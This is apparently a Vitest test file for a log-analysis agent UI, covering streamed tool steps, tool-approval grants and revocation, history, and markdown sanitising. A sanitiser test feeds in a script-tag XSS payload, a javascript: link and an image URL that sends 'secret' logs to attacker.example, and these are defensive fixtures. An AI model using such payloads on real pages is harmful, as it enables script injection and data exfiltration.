import { act, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter, Route, Routes } from 'react-router-dom';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import Agent from '../Agent';

import { useAgentStore } from '@/stores/useAgentStore';

const json = (value: unknown, status = 200) =>
  ({
    ok: status < 400,
    status,
    headers: new Headers({ 'content-type': 'application/json' }),
    json: async () => value,
  }) as Response;

/** A text/event-stream response that emits the given events, then closes. */
const sse = (events: Array<[string, unknown]>) => {
  const body = events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`);
  const encoder = new TextEncoder();
  return {
    ok: true,
    status: 200,
    headers: new Headers({ 'content-type': 'text/event-stream' }),
    body: new ReadableStream({
      start(controller) {
        // Split one event across chunks to exercise buffering.
        const all = body.join('');
        controller.enqueue(encoder.encode(all.slice(0, 25)));
        controller.enqueue(encoder.encode(all.slice(25)));
        controller.close();
      },
    }),
  } as unknown as Response;
};

const approvalStream = (signal?: AbortSignal) => {
  const encoder = new TextEncoder();
  let streamController: ReadableStreamDefaultController<Uint8Array>;
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      streamController = controller;
      controller.enqueue(
        encoder.encode(
          `event: approval_required\ndata: ${JSON.stringify({ id: 'secret-capability', tool: 'mcp__remote__write', input: { path: '/tmp/target', content: '<script>alert(1)</script>' }, reason: 'Writes an external file' })}\n\n`
        )
      );
    },
  });
  signal?.addEventListener('abort', () =>
    streamController.error(new DOMException('Aborted', 'AbortError'))
  );
  return {
    response: {
      ok: true,
      status: 200,
      headers: new Headers({ 'content-type': 'text/event-stream' }),
      body,
    } as Response,
    finish: () => {
      streamController.enqueue(
        encoder.encode('event: done\ndata: {"answer":"Finished safely.","steps":[]}\n\n')
      );
      streamController.close();
    },
  };
};

const waitingStream = (signal?: AbortSignal) => {
  let controller: ReadableStreamDefaultController<Uint8Array>;
  const body = new ReadableStream<Uint8Array>({
    start(value) {
      controller = value;
    },
  });
  signal?.addEventListener('abort', () =>
    controller.error(new DOMException('Aborted', 'AbortError'))
  );
  return {
    ok: true,
    status: 200,
    headers: new Headers({ 'content-type': 'text/event-stream' }),
    body,
  } as Response;
};

const renderPage = () =>
  render(
    <MemoryRouter>
      <Agent />
    </MemoryRouter>
  );

const ask = (text: string) => {
  fireEvent.change(screen.getByLabelText('Message the agent'), { target: { value: text } });
  fireEvent.click(screen.getByRole('button', { name: 'Send message' }));
};

beforeEach(() => {
  localStorage.clear();
  useAgentStore.setState({
    sessions: [],
    activeId: null,
    viewStepId: null,
    approvedInvestigations: {},
    grantRevisions: {},
  });
  vi.stubGlobal('fetch', vi.fn());
});

describe('Agent', () => {
  it('streams steps and text, then sends history with a digest of the tools used', async () => {
    const fetchMock = vi.mocked(fetch);
    fetchMock
      .mockResolvedValueOnce(json({ available: true, model: 'local-model' }))
      .mockResolvedValueOnce(
        sse([
          ['step_start', { id: 't1', tool: 'query_logs', input: { query: 'level:error' } }],
          [
            'step',
            {
              id: 't1',
              tool: 'query_logs',
              input: { query: 'level:error' },
              output: { total_count: 3, logs: [] },
            },
          ],
          ['text', { round: 1, delta: 'Found 3 ' }],
          ['text', { round: 1, delta: 'errors.' }],
          ['done', { answer: 'Found 3 errors.', steps: [] }],
        ])
      )
      // The dock reloads its status after each turn.
      .mockResolvedValueOnce(json({ available: true, model: 'local-model' }))
      .mockResolvedValueOnce(sse([['done', { answer: 'Two are from auth.', steps: [] }]]))
      .mockResolvedValueOnce(json({ available: true, model: 'local-model' }));
    renderPage();
    await screen.findByText('local-model');
    ask('Find errors');
    await screen.findByText('Found 3 errors.');
    expect(screen.getByText('Search logs')).toBeTruthy();
    expect(screen.getByText('3 matching events')).toBeTruthy();
    fireEvent.click(screen.getByText('Search logs').closest('summary')!);
    expect(screen.getByText(/"total_count": 3/)).toBeTruthy();

    ask('Which service?');
    await screen.findByText('Two are from auth.');
    const body = JSON.parse(String(fetchMock.mock.calls[3][1]?.body));
    expect(body.stream).toBe(true);
    expect(body.messages).toHaveLength(3);
    expect(body.messages[1].role).toBe('assistant');
    expect(body.messages[1].content).toContain('Found 3 errors.');
    expect(body.messages[1].content).toContain('query_logs');
    expect(body.messages[2]).toEqual({ role: 'user', content: 'Which service?' });
  });

  it('shows unavailable status and disables requests', async () => {
    vi.mocked(fetch).mockResolvedValueOnce(
      json({ available: false, reason: 'Configure a model.' })
    );
    renderPage();
    await screen.findByText('Unavailable');
    expect(screen.getByText('Configure a model.')).toBeTruthy();
    expect((screen.getByLabelText('Message the agent') as HTMLTextAreaElement).disabled).toBe(true);
    expect(fetch).toHaveBeenCalledTimes(1);
  });

  it('links to agent settings from the unavailable notice and the header', async () => {
    vi.mocked(fetch).mockResolvedValue(json({ available: false, reason: 'Configure a model.' }));
    const routes = (
      <Routes>
        <Route path="/" element={<Agent />} />
        <Route path="/settings/agent" element={<p>Agent settings page</p>} />
      </Routes>
    );
    const { unmount } = render(<MemoryRouter>{routes}</MemoryRouter>);
    fireEvent.click(await screen.findByRole('button', { name: 'Open agent settings' }));
    expect(screen.getByText('Agent settings page')).toBeTruthy();
    unmount();

    render(<MemoryRouter>{routes}</MemoryRouter>);
    fireEvent.click(screen.getByRole('button', { name: 'Agent settings' }));
    expect(screen.getByText('Agent settings page')).toBeTruthy();
  });

  it('keeps completed steps when the stream ends in an error', async () => {
    vi.mocked(fetch)
      .mockResolvedValueOnce(json({ available: true }))
      .mockResolvedValueOnce(
        sse([
          ['step_start', { id: 'a', tool: 'facet_logs', input: {} }],
          ['step', { id: 'a', tool: 'facet_logs', input: {}, output: { fields: [{}, {}] } }],
          ['step_start', { id: 'b', tool: 'log_histogram', input: {} }],
          ['error', { error: 'agent tool limit reached', steps: [] }],
        ])
      );
    const { container } = renderPage();
    await screen.findByText('Ready');
    ask('Inspect warnings');
    await screen.findByText('agent tool limit reached');
    expect(screen.getByText('2 fields broken down')).toBeTruthy();
    // The step still running when the stream failed is settled as failed.
    expect(container.querySelector('.ls-step.is-running')).toBeNull();
    expect(container.querySelectorAll('.ls-step.is-error')).toHaveLength(1);
  });

  it('accepts a plain JSON reply from an older backend and labels UI tools by task', async () => {
    vi.mocked(fetch)
      .mockResolvedValueOnce(json({ available: true }))
      .mockResolvedValueOnce(
        json({
          answer: 'The view shows six events.',
          steps: [
            {
              id: 'u1',
              tool: 'ui_show_view',
              input: { query: 'level:ERROR' },
              output: { status: 'applied', state: { result_count: 6 } },
            },
          ],
        })
      );
    renderPage();
    await screen.findByText('Ready');
    ask('Show errors');
    await screen.findByText('The view shows six events.');
    expect(screen.getByText('Update the log view')).toBeTruthy();
    expect(screen.getByText('6 matching events on screen')).toBeTruthy();
    expect(screen.queryByText('Ui show view')).toBeNull();
  });

  it('renders markdown safely', async () => {
    vi.mocked(fetch)
      .mockResolvedValueOnce(json({ available: true }))
      .mockResolvedValueOnce(
        sse([
          [
            'done',
            {
              answer:
                '## Findings\n\n- **Auth** failed\n\n<script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n![secret](https://attacker.example/collect?logs=secret)\n\n[safe](https://example.com)',
              steps: [],
            },
          ],
        ])
      );
    const { container } = renderPage();
    await screen.findByText('Ready');
    ask('Summarize');
    await screen.findByRole('heading', { name: 'Findings' });
    expect(screen.getByText('Auth').tagName).toBe('STRONG');
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('href="javascript:');
    expect(screen.getByRole('link', { name: 'safe' }).getAttribute('rel')).toBe(
      'noreferrer noopener'
    );
  });

  it.each([true, false])('submits an approval decision once (approve=%s)', async (approve) => {
    const fetchMock = vi.mocked(fetch);
    let live: ReturnType<typeof approvalStream>;
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    fetchMock.mockImplementationOnce((_url, options) => {
      live = approvalStream(options?.signal || undefined);
      return Promise.resolve(live.response);
    });
    fetchMock.mockResolvedValueOnce(json({ status: approve ? 'approved' : 'denied' }));
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    renderPage();
    await screen.findByText('Ready');
    ask('Write report');
    const card = await screen.findByRole('region', { name: 'Tool approval required' });
    expect(card.textContent).toContain('mcp__remote__write');
    expect(card.textContent).toContain('"path": "/tmp/target"');
    expect(card.querySelector('script')).toBeNull();
    expect(localStorage.getItem('logsonic-agent')).not.toContain('secret-capability');
    const button = screen.getByRole('button', { name: approve ? 'Approve once' : 'Deny' });
    fireEvent.click(button);
    fireEvent.click(button);
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(3));
    const [url, options] = fetchMock.mock.calls[2];
    expect(url).toContain('/agent/approve');
    expect(JSON.parse(String(options?.body))).toEqual({ id: 'secret-capability', approve });
    live!.finish();
    await screen.findByText('Finished safely.');
    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
    expect(localStorage.getItem('logsonic-agent')).not.toContain('secret-capability');
  });

  it('keeps the decision visible after submission failure and clears it on stop', async () => {
    const fetchMock = vi.mocked(fetch);
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    fetchMock.mockImplementationOnce((_url, options) =>
      Promise.resolve(approvalStream(options?.signal || undefined).response)
    );
    fetchMock.mockResolvedValueOnce(json({ error: 'expired' }, 404));
    renderPage();
    await screen.findByText('Ready');
    ask('Write report');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Approve once' }));
    await screen.findByText(/expired/);
    expect(screen.getByRole('region', { name: 'Tool approval required' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
    await screen.findByText('Stopped.');
    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
  });

  it('locks history while a stream awaits approval so a second run cannot replace it', async () => {
    const now = Date.now();
    useAgentStore.setState({
      sessions: [
        {
          id: 'older',
          title: 'Earlier question',
          createdAt: now,
          updatedAt: now,
          turns: [
            {
              user: 'Earlier question',
              items: [],
              answer: 'Earlier answer',
              pending: false,
              startedAt: now,
              finishedAt: now,
            },
          ],
        },
      ],
      activeId: null,
    });
    const fetchMock = vi.mocked(fetch);
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    fetchMock.mockImplementationOnce((_url, options) =>
      Promise.resolve(approvalStream(options?.signal || undefined).response)
    );
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    renderPage();
    await screen.findByText('Ready');
    ask('Current question');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
    const old = screen.getByRole('button', { name: /^Earlier question/ });
    expect((old as HTMLButtonElement).disabled).toBe(true);
    expect(
      (screen.getByRole('button', { name: 'Delete Earlier question' }) as HTMLButtonElement)
        .disabled
    ).toBe(true);
    fireEvent.click(old);
    expect(useAgentStore.getState().activeId).not.toBe('older');
    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
    expect(
      (screen.getByRole('button', { name: 'New investigation' }) as HTMLButtonElement).disabled
    ).toBe(true);
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
    await screen.findByText('Stopped.');
    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
    expect(
      fetchMock.mock.calls.filter(([url]) => String(url).includes('/agent/chat'))
    ).toHaveLength(1);
  });

  it('grants all tools only to this investigation and sends the grant on later turns', async () => {
    const fetchMock = vi.mocked(fetch);
    let first: ReturnType<typeof approvalStream>;
    let chats = 0;
    fetchMock.mockImplementation((url, options) => {
      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
      if (String(url).endsWith('/agent/approve'))
        return Promise.resolve(json({ status: 'approved' }));
      if (String(url).endsWith('/agent/chat')) {
        chats++;
        if (chats === 1) {
          first = approvalStream(options?.signal || undefined);
          return Promise.resolve(first.response);
        }
        return Promise.resolve(sse([['done', { answer: `Answer ${chats}`, steps: [] }]]));
      }
      throw new Error(`Unexpected fetch: ${String(url)}`);
    });
    const { unmount } = renderPage();
    await screen.findByText('Ready');
    ask('Original investigation');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
    await waitFor(() =>
      expect(fetchMock.mock.calls.some(([url]) => String(url).endsWith('/agent/approve'))).toBe(
        true
      )
    );
    const approvalCall = fetchMock.mock.calls.find(([url]) =>
      String(url).endsWith('/agent/approve')
    )!;
    expect(JSON.parse(String(approvalCall[1]?.body))).toEqual({
      id: 'secret-capability',
      approve: true,
      approve_all: true,
    });
    first!.finish();
    await screen.findByText('Finished safely.');
    expect(screen.getByText('All tools approved for this investigation')).toBeTruthy();
    expect(localStorage.getItem('logsonic-agent')).not.toContain('approvedInvestigations');
    expect(localStorage.getItem('logsonic-agent')).not.toContain('approve_all');
    unmount();
    renderPage();
    await screen.findByText('All tools approved for this investigation');
    ask('Follow up');
    await screen.findByText('Answer 2');
    const chatCalls = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
    expect(JSON.parse(String(chatCalls[1][1]?.body)).approve_all).toBe(true);
    fireEvent.click(screen.getByRole('button', { name: 'New investigation' }));
    ask('Separate investigation');
    await screen.findByText('Answer 3');
    const laterChats = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
    expect(JSON.parse(String(laterChats[2][1]?.body)).approve_all).toBeUndefined();
    expect(screen.queryByText('All tools approved for this investigation')).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
    fireEvent.click(screen.getByRole('button', { name: /^Original investigation/ }));
    expect(screen.getByText('All tools approved for this investigation')).toBeTruthy();
  });

  it('revokes all-tool approval and aborts an in-flight stream', async () => {
    const fetchMock = vi.mocked(fetch);
    let first: ReturnType<typeof approvalStream>;
    let chats = 0;
    fetchMock.mockImplementation((url, options) => {
      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
      if (String(url).endsWith('/agent/approve'))
        return Promise.resolve(json({ status: 'approved' }));
      if (String(url).endsWith('/agent/chat')) {
        chats++;
        if (chats === 1) {
          first = approvalStream(options?.signal || undefined);
          return Promise.resolve(first.response);
        }
        if (chats === 2) return Promise.resolve(waitingStream(options?.signal || undefined));
        return Promise.resolve(sse([['done', { answer: 'After revocation', steps: [] }]]));
      }
      throw new Error(`Unexpected fetch: ${String(url)}`);
    });
    renderPage();
    await screen.findByText('Ready');
    ask('Investigate');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
    await screen.findByText('All tools approved for this investigation');
    first!.finish();
    await screen.findByText('Finished safely.');
    ask('Long operation');
    await waitFor(() => expect(chats).toBe(2));
    fireEvent.click(screen.getByRole('button', { name: 'Require approvals' }));
    await screen.findByText('Stopped.');
    expect(screen.queryByText('All tools approved for this investigation')).toBeNull();
    ask('Next operation');
    await screen.findByText('After revocation');
    const chatCalls = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
    expect(JSON.parse(String(chatCalls[1][1]?.body)).approve_all).toBe(true);
    expect(JSON.parse(String(chatCalls[2][1]?.body)).approve_all).toBeUndefined();
  });

  it('keeps an approve-all decision when its successful POST returns after the stream ends', async () => {
    const fetchMock = vi.mocked(fetch);
    let first: ReturnType<typeof approvalStream>;
    let resolveApproval!: (response: Response) => void;
    fetchMock.mockImplementation((url, options) => {
      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
      if (String(url).endsWith('/agent/chat')) {
        first = approvalStream(options?.signal || undefined);
        return Promise.resolve(first.response);
      }
      if (String(url).endsWith('/agent/approve'))
        return new Promise<Response>((resolve) => {
          resolveApproval = resolve;
        });
      throw new Error(`Unexpected fetch: ${String(url)}`);
    });
    renderPage();
    await screen.findByText('Ready');
    ask('Investigate');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
    first!.finish();
    await screen.findByText('Finished safely.');
    resolveApproval(json({ status: 'approved' }));
    await screen.findByText('All tools approved for this investigation');
  });

  it('does not restore an all-tools grant from localStorage on rehydrate', async () => {
    localStorage.setItem(
      'logsonic-agent',
      JSON.stringify({
        state: { approvedInvestigations: { forged: true } },
        version: 1,
      })
    );
    await useAgentStore.persist.rehydrate();
    expect(useAgentStore.getState().approvedInvestigations).toEqual({});
  });

  it('does not restore a grant when a delayed approval response follows revocation', async () => {
    const fetchMock = vi.mocked(fetch);
    let first: ReturnType<typeof approvalStream>;
    let resolveApproval!: (response: Response) => void;
    fetchMock.mockImplementation((url, options) => {
      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
      if (String(url).endsWith('/agent/chat')) {
        first = approvalStream(options?.signal || undefined);
        return Promise.resolve(first.response);
      }
      if (String(url).endsWith('/agent/approve'))
        return new Promise<Response>((resolve) => {
          resolveApproval = resolve;
        });
      throw new Error(`Unexpected fetch: ${String(url)}`);
    });
    const { unmount } = renderPage();
    await screen.findByText('Ready');
    ask('Investigate');
    await screen.findByRole('region', { name: 'Tool approval required' });
    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
    first!.finish();
    await screen.findByText('Finished safely.');
    const id = useAgentStore.getState().activeId!;
    unmount();
    renderPage();
    act(() => useAgentStore.getState().grantInvestigation(id));
    fireEvent.click(await screen.findByRole('button', { name: 'Require approvals' }));
    await act(async () => resolveApproval(json({ status: 'approved' })));
    expect(useAgentStore.getState().approvedInvestigations[id]).toBeUndefined();
  });

  it('stops a running request and permits retry', async () => {
    const fetchMock = vi.mocked(fetch);
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    fetchMock.mockImplementationOnce(
      (_url, options) =>
        new Promise((_resolve, reject) => {
          options?.signal?.addEventListener('abort', () =>
            reject(new DOMException('Aborted', 'AbortError'))
          );
        })
    );
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    fetchMock.mockResolvedValueOnce(sse([['done', { answer: 'Completed on retry.', steps: [] }]]));
    fetchMock.mockResolvedValueOnce(json({ available: true }));
    renderPage();
    await screen.findByText('Ready');
    ask('Inspect logs');
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
    await screen.findByText('Stopped.');
    fireEvent.click(screen.getByRole('button', { name: 'Retry' }));
    await screen.findByText('Completed on retry.');
    // Status, stopped request, status, retry, status.
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(5));
  });

  it('keeps past investigations and reopens them from history', async () => {
    vi.mocked(fetch)
      .mockResolvedValueOnce(json({ available: true }))
      .mockResolvedValueOnce(sse([['done', { answer: 'First answer.', steps: [] }]]));
    renderPage();
    await screen.findByText('Ready');
    ask('First question');
    await screen.findByText('First answer.');
    fireEvent.click(screen.getByRole('button', { name: 'New investigation' }));
    expect(screen.getByRole('heading', { name: 'Ask about your logs' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
    fireEvent.click(screen.getByText('First question'));
    expect(screen.getByText('First answer.')).toBeTruthy();
    const persisted = JSON.parse(localStorage.getItem('logsonic-agent') || '{}');
    expect(persisted.state.sessions[0].turns[0].answer).toBe('First answer.');
  });

  it('refreshes workspaces when save_view succeeds and shows remote endpoint note', async () => {
    const refreshSpy = vi.fn().mockResolvedValue(undefined);
    const { useWorkspaceStore } = await import('@/stores/useWorkspaceStore');
    useWorkspaceStore.setState({ refreshWorkspaces: refreshSpy });

    vi.mocked(fetch)
      .mockResolvedValueOnce(
        json({
          available: true,
          model: 'claude-sonnet-5-5',
          proxy_url: 'https://api.anthropic.com/v1/messages',
        })
      )
      .mockResolvedValueOnce(
        sse([
          [
            'step',
            {
              id: 'sv1',
              tool: 'save_view',
              input: { name: 'Checkout Spike' },
              output: { id: 'ws-1', name: 'Checkout Spike', matching_rows: 12 },
              is_error: false,
            },
          ],
          ['done', { answer: 'Saved view.', steps: [] }],
        ])
      )
      .mockResolvedValueOnce(
        json({
          available: true,
          model: 'claude-sonnet-5-5',
          proxy_url: 'https://api.anthropic.com/v1/messages',
        })
      );

    renderPage();
    await screen.findByText('claude-sonnet-5-5');
    expect(
      screen.getByText(
        'Log excerpts the agent reads are sent to the configured model endpoint (api.anthropic.com).'
      )
    ).toBeTruthy();

    ask('Save this view');
    await screen.findByText('Saved view.');
    expect(refreshSpy).toHaveBeenCalledTimes(1);
  });
});
